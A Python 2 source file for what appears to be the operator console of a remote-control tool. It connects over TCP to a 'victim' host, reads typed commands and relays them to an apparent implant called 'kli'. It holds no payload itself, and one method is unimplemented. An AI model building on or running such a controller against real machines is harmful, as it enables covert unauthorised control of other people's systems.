from Commands import parse_command
from Universal.constants import ConnectionConstants as consts
from Universal import SocketHandler, Helper
import sys


class HeadQuarters(object):
    def __init__(self, victim_hostname):
        self.victim_hostname = victim_hostname
        self._connect_to_kli()

    def _connect_to_kli(self):
        """
            Method initiates the connection to victim using SocketHandler class.
        """
        try:
            self.connection_socket = SocketHandler(client=True, connect_to=self.victim_hostname,
                                                   tcp_port=consts.TCP_PORT, socket_timeout=consts.SOCKET_TIMEOUT_LENGTH)
        except RuntimeError:
            # connection failed - end run
            Helper.print_and_log(consts.CONNECTION_FAILED_MSG.format(self.victim_hostname))
            raw_input()
            sys.exit()

        # connection successful!
        Helper.print_and_log(consts.CONNECTION_SUCCESS_MSG.format(self.connection_socket.peer_ip))

    def _create_log_file(self):
        raise NotImplementedError("Implement me!")

    def _send_command_to_kli_and_get_response(self, command_literal):
        """
            Method sends the received command literal to kli and waits for ack.
        """
        command_response = self.connection_socket.send_command(command_literal)
        if not command_response:
            # socket timed-out
            return False
        return True

    def run(self):
        keep_alive = None

        while keep_alive is None:
            command_literal = raw_input("Insert command: ",)
            Helper.print_and_log()
            command = parse_command(command_literal, self.connection_socket)
            if command:
                # command is valid syntax-wise
                command_response = self._send_command_to_kli_and_get_response(command_literal)
                if command_response:
                    keep_alive = command.run()
                else:
                    # kli did not respond to the command
                    Helper.print_and_log(consts.KLI_NOT_RESPONDING_WARNING_MSG)
                    Helper.print_and_log()
                    continue

            Helper.print_and_log()






